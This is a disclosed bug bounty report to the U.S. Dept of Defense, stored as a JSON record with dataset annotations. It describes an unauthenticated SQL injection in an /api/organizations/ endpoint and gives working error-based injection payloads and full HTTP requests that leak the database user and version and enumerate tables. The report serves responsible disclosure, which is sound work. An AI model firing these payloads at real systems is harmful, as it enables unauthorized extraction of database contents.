{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "0xd0ff9 ",
  "title": "Unauthenticated SQL Injection at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  [HtUS]",
  "content": "\nSummary\nHi team, I found Unauthenticated SQL Injection at \u2588\u2588\u2588\u2588\u2588\u2588. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.\nStep to Reproduce:\nExecute Request\nCode 465 Bytes\n1GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588 \n3User-Agent: Mozilla/5.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 \n5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 \n6Accept-Encoding: gzip, deflate \n7Upgrade-Insecure-Requests: 1 \n8Sec-Fetch-Dest: document \n9Sec-Fetch-Mode: navigate \n10Sec-Fetch-Site: none \n11Sec-Fetch-User: ?1 \n12Te: trailers\n13\n14\n15\nThen the response is\nCode 883 Bytes\n1HTTP/1.1 500 Internal Server Error\n2Content-Type: application/json; charset=utf-8\n3Content-Length: 209\n4Cross-Origin-Embedder-Policy: require-corp\n5Cross-Origin-Opener-Policy: same-origin\n6Cross-Origin-Resource-Policy: same-origin\n7X-DNS-Prefetch-Control: off\n8Expect-CT: max-age=0\n9X-Frame-Options: SAMEORIGIN\n10X-Download-Options: noopen\n11X-Content-Type-Options: nosniff\n12Origin-Agent-Cluster: ?1\n13X-Permitted-Cross-Domain-Policies: none\n14Referrer-Policy: no-referrer\n15X-XSS-Protection: 0\n16Strict-Transport-Security: max-age=31536000\n17Expires: Tue, 05 Jul 2022 04:12:11 GMT\n18Cache-Control: max-age=0, no-cache, no-store\n19Pragma: no-cache\n20Date: Tue, 05 Jul 2022 04:12:11 GMT\n21Connection: keep-alive\n22\n23{\"statusCode\":500,\"code\":\"P2010\",\"error\":\"Internal Server Error\",\"message\":\"\\nInvalid `prisma.queryRaw()` invocation:\\n\\n\\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'`\"}\nThe result was leaked by SQL XPATH Error, so we get user() = \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nChange query to version() we get version = 8.0.23\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa\nChange query to version() we get database = \u2588\u2588\u2588\nhttps://\u2588\u2588\u2588/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\nTo extract data, we use this requests\nCode 490 Bytes\n1GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588 \n3User-Agent: Mozilla/5.0  \n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 \n5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 \n6Accept-Encoding: gzip, deflate \n7Upgrade-Insecure-Requests: 1 \n8Sec-Fetch-Dest: document \n9Sec-Fetch-Mode: navigate \n10Sec-Fetch-Site: none \n11Sec-Fetch-User: ?1 \n12Te: trailers\n13\n14\n\u2588\u2588\u2588\u2588\u2588\nImpact\nAttacker can extract database from server \u2588\u2588\u2588\u2588\u2588\n\n",
  "severity": [
    9.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1665784440,
  "report_url": "https://hackerone.com/reports/1626226",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a GET request to the vulnerable endpoint with a SQL injection payload: `/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa`"
    ],
    [
      2,
      "Observe the error response containing database information (e.g., user, version, or database name) in the XPATH error message."
    ]
  ],
  "vuln_description": "An unauthenticated SQL injection vulnerability exists in the `/api/organizations/*` endpoint due to lack of input filtering and escaping. Attackers can inject malicious SQL payloads to extract sensitive database information via error-based techniques.",
  "reason": "The vulnerability is straightforward to exploit using common SQL injection techniques (error-based) without requiring complex application state manipulation or novel logic. The attack involves a single component (the vulnerable endpoint) and follows well-known patterns for SQL injection.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves unauthenticated access to an API endpoint with non-filtered and non-escaped input. The methodology described focuses on authentication and authorization bypasses by swapping user sessions and resource IDs, but does not specifically address input validation vulnerabilities like SQL injection. The SQL injection is detected through error-based techniques, which are outside the scope of the described methodology.",
    "is_detectable": false
  }
}